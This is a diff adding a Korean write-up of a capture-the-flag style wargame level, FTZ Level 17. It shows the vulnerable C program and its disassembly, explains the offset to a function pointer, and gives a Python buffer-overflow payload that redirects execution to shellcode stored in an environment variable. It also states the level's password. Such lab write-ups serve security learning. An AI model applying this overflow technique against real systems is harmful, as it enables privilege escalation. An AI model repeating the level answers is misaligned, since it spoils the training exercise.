@@ -103,3 +103,64 @@ my-pass 하면 비밀번호가 나온다
 
 답 == king poetic
 
+#================================================================================#
+#FTZ Level 17
+hint)
+void printit() {
+  printf("Hello there!\n");
+}
+ 
+main()
+{ int crap;
+  void (*call)()=printit;
+  char buf[20];
+  fgets(buf,48,stdin);
+  setreuid(3098,3098);
+  call();
+}
+
+
+
+#FTZ Level 17 풀이 과정)
+전과 다르게 코드가 shell 스크립트를 실행하는 코드가 없다. 딱보니 그냥 eggshell 주소를 대입하면 될 것 같았다.
+그래도 혹시모르니 까봤으나 역시나, 똑같다.
+
+Dump of assembler code for function main:
+0x080484a8 <main+0>:	push   ebp
+0x080484a9 <main+1>:	mov    ebp,esp
+0x080484ab <main+3>:	sub    esp,0x38
+0x080484ae <main+6>:	mov    DWORD PTR [ebp-16],0x8048490
+0x080484b5 <main+13>:	sub    esp,0x4
+0x080484b8 <main+16>:	push   ds:0x804967c
+0x080484be <main+22>:	push   0x30
+0x080484c0 <main+24>:	lea    eax,[ebp-56]
+0x080484c3 <main+27>:	push   eax
+0x080484c4 <main+28>:	call   0x8048350 <fgets>
+0x080484c9 <main+33>:	add    esp,0x10
+0x080484cc <main+36>:	sub    esp,0x8
+0x080484cf <main+39>:	push   0xc1a
+0x080484d4 <main+44>:	push   0xc1a
+0x080484d9 <main+49>:	call   0x8048380 <setreuid>
+0x080484de <main+54>:	add    esp,0x10
+0x080484e1 <main+57>:	mov    eax,DWORD PTR [ebp-16]
+0x080484e4 <main+60>:	call   eax
+0x080484e6 <main+62>:	leave  
+0x080484e7 <main+63>:	ret    
+0x080484e8 <main+64>:	nop    
+0x080484e9 <main+65>:	nop    
+0x080484ea <main+66>:	nop    
+0x080484eb <main+67>:	nop    
+0x080484ec <main+68>:	nop    
+0x080484ed <main+69>:	nop    
+0x080484ee <main+70>:	nop    
+0x080484ef <main+71>:	nop  
+
+거리 구하는 것은 전과 같다.
+
+40바이트 뒤에 에그쉘 주소를 리틀 엔디언 방식으로 입력하면 끝.
+
+페이로드
+(python -c 'print "A"*40+"\xc5\xf2\xff\xbf"'; cat) | ./attackme
+
+
+답 == why did you do it
